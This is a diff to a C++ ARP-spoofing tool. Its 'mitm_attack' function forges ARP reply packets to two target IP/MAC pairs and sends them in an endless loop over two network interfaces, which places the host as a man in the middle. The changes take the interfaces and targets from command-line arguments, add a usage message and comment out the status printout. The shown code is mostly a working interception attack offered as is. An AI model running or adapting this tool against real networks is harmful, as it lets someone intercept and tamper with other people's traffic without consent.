@@ -3,29 +3,25 @@
 #include <pcap.h>
 #include <thread>
 
-const char* dev1 = "wlan0";
-const char* dev2 = "wlan1";
 
-const char* dumpfile = "dump.pcap";
-
-void mitm_attack(const char* ip1, const char* mac1, 
+void mitm_attack(const char* dev, const char* dev2, const char* ip1, const char* mac1, 
 					const char* ip2, const char* mac2);
-void capture(const char* ip1, const char* ip2);
 
 
 
 int main(int argc,char** argv){
-	if(argc != 5){
-		printf("args\n");
+	if(argc != 7){
+		printf("Usage: %s interface1 interface2 target1IP target1MAC target2IP target2MAC\n",
+				argv[0]);
 		return -1;
 	}
 
-	std::thread mitm(mitm_attack, argv[1], argv[2], argv[3], argv[4]);
+	mitm_attack(argv[1], argv[2], argv[3], argv[4], argv[5], argv[6]);
 }
 
 
-void mitm_attack(const char* ip1, const char* mac1, 
-					const char* ip2, const char* mac2){
+void mitm_attack(const char* dev1, const char* dev2, const char* ip1, const char* mac1, 
+													const char* ip2, const char* mac2){
 	pgen_arp pack_to_target1;
 	pgen_arp pack_to_target2;
 
@@ -47,11 +43,13 @@ void mitm_attack(const char* ip1, const char* mac1,
 	pack_to_target2.ARP.operation = PGEN_ARPOP_REPLY;
 
 	for(int i=0; ; i++){
+		/*
 		printf("0x%04x: %s[%s] <MITM> %s[%s] \n", i, 
 				pack_to_target1.ARP.dstIp.c_str(),
 				pack_to_target1.ARP.dstEth.c_str(),
 				pack_to_target2.ARP.dstIp.c_str(),
 				pack_to_target2.ARP.dstEth.c_str() );
+		*/
 
 		pack_to_target1.SEND(dev1);
 		pack_to_target2.SEND(dev2);
